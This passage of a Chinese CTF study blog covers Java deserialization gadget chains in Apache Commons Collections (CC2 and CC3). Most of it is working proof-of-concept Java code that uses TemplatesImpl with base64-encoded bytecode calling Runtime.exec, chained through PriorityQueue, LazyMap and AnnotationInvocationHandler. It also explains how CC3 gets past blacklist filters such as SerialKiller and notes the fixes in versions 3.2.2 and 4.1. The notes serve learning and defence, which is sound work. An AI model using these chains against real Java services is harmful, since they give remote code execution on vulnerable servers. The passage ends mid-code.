class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2_p_TemplatesImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytescode() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">byte</span>[]) Base64.decode(<span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getBytescode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(obj);</span><br><span class="line">        queue.add(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC链之死"><a href="#CC链之死" class="headerlink" title="CC链之死"></a>CC链之死</h2><blockquote><p>CC链的利用只能在于3.2.2之前和4.1之前</p></blockquote><ol><li><p>Apache Commons Collections官⽅在2015年底得知序列化相关的问题后，就在两个分⽀上同时发布了新的版本，4.1和3.2.2</p></li><li><p>p牛原文</p><blockquote><p>先看3.2.2，通过diff可以发现，新版代码中增加了⼀个⽅法 FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。如果开发者没有设置全 局配置 org.apache.commons.collections.enableUnsafeSerialization&#x3D;true ，即默认情况下会 抛出异常。 这个检查在常⻅的危险Transformer类 （ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransforme r 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常<br>再看4.1，修复⽅式⼜不⼀样。4.1⾥，这⼏个危险Transformer类不再实现 Serializable 接⼝，也就 是说，他们⼏个彻底⽆法序列化和反序列化了。更绝</p></blockquote></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java安全指南</li><li>信工所大佬</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(6)_CC3</title>
      <link href="/2024/11/20/Java%E5%AE%89%E5%85%A85(6)_CC3/"/>
      <url>/2024/11/20/Java%E5%AE%89%E5%85%A85(6)_CC3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>常见的ClassLoader搞了我好久，还是太菜了，第一次学没学扎实</p></blockquote><h2 id="TemplatesImpl与CC1那天喝醉了"><a href="#TemplatesImpl与CC1那天喝醉了" class="headerlink" title="TemplatesImpl与CC1那天喝醉了"></a>TemplatesImpl与CC1那天喝醉了</h2><blockquote><p>下面给出一个CC3半条链的poc，但并不是cc3，用到是cc1中LazyMap这条链</p></blockquote><ol><li>CC1中用到了一个<code>ConstantTransformer</code>，CC1是直接Runtime然后exec</li><li>可以修改为<code>TemplatesImpl</code>，调用<code>new Transformer()</code>进行恶意执行</li><li>其实原理上就是单纯的拼接问题</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HalfCC3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* * * * * * 1. 获取Templ...对象 * * * * * */</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 反射构造调用条件 * * * * * */</span></span><br><span class="line">            <span class="comment">// 0. payload</span></span><br><span class="line">            <span class="type">byte</span>[] payload = Base64.decode(<span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>);</span><br><span class="line">            <span class="comment">// 1. 设置_name</span></span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="comment">// 2. 设置_bytecodes，放入恶意类就好</span></span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;payload&#125;);</span><br><span class="line">            <span class="comment">// 3. 设置_tfactory，非强制，比较慢调用，不会编译错误</span></span><br><span class="line">            <span class="comment">// setFieldValue(triggerObj,&quot;_tfactory&quot;,new TransformerFactoryImpl() );</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 构建转换器 * * * * * */</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="comment">// 这里不使用Runtime了也不需要反射，直接放入一个对象就可以了</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(triggerObj),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span> ,<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">trigger_transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 构造lazymap * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,trigger_transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 5. 反射创建我的handler * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">lazyHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class,lazyMap);  <span class="comment">// 这里的Retention是没有作用的，用来占位</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 6. 在readObject时调用invoke * * * * * */</span></span><br><span class="line">            <span class="comment">// 通过动态代理来调用invoke</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">proxyedLazyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),lazyMap.getClass().getInterfaces(),lazyHandler);</span><br><span class="line">            <span class="comment">// AnnotationInvocationHandler就可，有Iterator var4 = this.memberValues.entrySet().iterator();</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class, proxyedLazyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 7. 模拟序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();    <span class="comment">// 这里如果注释掉不会弹出来计算器，但是要是不注释就会弹，说明正确的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field_name, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field_name);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="为什么需要CC3"><a href="#为什么需要CC3" class="headerlink" title="为什么需要CC3"></a>为什么需要CC3</h2><ol><li>在反序列化漏洞被挖掘出来后，类似SerialKiller这样的过滤⼯具随之诞⽣</li><li>通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的类: InvokerTransformer赫然在列，对CC1和高版本使用的CC6都做出了截断，所以<strong>使用CC3来进行绕过</strong></li></ol><h2 id="com-sun-org-apache-xalan-internal-xsltc-trax-TrAXFilter"><a href="#com-sun-org-apache-xalan-internal-xsltc-trax-TrAXFilter" class="headerlink" title="com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"></a>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</h2><blockquote><p>cc3利用的主要类</p></blockquote><ol><li><p>idea看看类</p><ol><li>在TrAXFilter这个类的构造函数中自动调用了<code>templates.newTransformer()</code></li><li>只要我们传入的模板是一个TemplatesImpl实例的话(并设置paylaod)，则可以调用payload</li><li><strong>Q: 下一步呢？</strong>: 按照思路是找一个方法中调用这个构造函数并且参数可控，有点难搞<ol><li>A: ysoserial的方法是找到了一个<strong>可以调用构造函数的Transformer: InstantiateTransformer</strong></li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilter</span> <span class="keyword">extends</span> <span class="title class_">XMLFilterImpl</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Templates              _templates;</span><br><span class="line">    <span class="keyword">private</span> TransformerImpl        _transformer;</span><br><span class="line">    <span class="keyword">private</span> TransformerHandlerImpl _transformerHandler;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">_useServicesMechanism</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">        _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><ol><li><p>还是idea看看源码</p><ol><li>这个transformer主要通过<code>getInstance()</code>来获取转换器对象，提供了两个构造函数，看源码就ok了<ol><li>private无参</li><li>public有参</li></ol></li><li>重点还得看看这里的<code>transform()</code>方法，是原本CC1和CC6中的触发点，可以看到这里可以获取到的只是<strong>公有的构造函数，私应该不行，并且会直接调用newInstance()方法，返回的是这个类的对象而不是这个类(是一个坑)<strong>，可以用来调用TrAXFilter的public构造函数并直接传入我们构造好的对象 –&gt; 这里不好直接用TemplatesImpl公有构造函数来实现，</strong>难以设置paylaod，再套一层比较容易进行操作</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstantiateTransformer</span> <span 